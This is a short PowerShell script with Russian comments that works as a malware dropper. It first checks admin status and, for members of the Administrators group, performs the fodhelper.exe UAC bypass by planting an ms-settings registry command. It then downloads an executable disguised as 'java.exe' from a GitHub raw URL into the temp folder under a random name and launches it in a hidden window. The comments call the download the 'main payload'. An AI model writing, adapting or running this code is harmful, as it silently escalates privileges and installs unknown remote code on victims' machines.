# 1. Проверяем, являемся ли мы уже админом
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (!$isAdmin) {
    # 2. Мы НЕ админ. Пытаемся проверить, есть ли смысл пробовать байпас (входим ли мы в группу админов)
    $userGroups = [Security.Principal.WindowsIdentity]::GetCurrent().Groups
    $adminSid = New-Object Security.Principal.SecurityIdentifier("S-1-5-32-544") # SID группы администраторов
    $canElevate = $userGroups -contains $adminSid

    if ($canElevate) {
        # Если мы в группе админов, пробуем байпас через реестр (твой старый код)
        $program = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Normal -File `"$PSCommandPath`""
        $registryPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
        if (!(Test-Path $registryPath)) { New-Item $registryPath -Force | Out-Null }
        New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
        Set-ItemProperty -Path $registryPath -Name "(default)" -Value $program -Force | Out-Null
        
        Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
        Start-Sleep 1.5
        Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
        exit
    } else {
        # Если мы вообще не админ, байпас не выйдет. 
        # Просто идем дальше и выполняем скачивание под обычным пользователем.
        Write-Host "Admin rights not available, running with limited privileges."
    }
}

# 3. Основная полезная нагрузка (выполнится либо если мы админ, либо если мы обычный юзер)
# Для скачивания в $env:TEMP права админа не нужны — это имба.
try {
    $url = "https://github.com/3465h/idkkkk/raw/refs/heads/main/java.exe"
    $file = "$env:TEMP\$([guid]::NewGuid()).exe"

    Invoke-WebRequest -Uri $url -OutFile $file -UseBasicParsing -ErrorAction Stop;
    
    # Запускаем. Если мы админ — запустится от админа. Если нет — от юзера.
    Start-Process -FilePath $file -WindowStyle Hidden -Wait;
} catch {
    Write-Host "Something went wrong: $_"
}
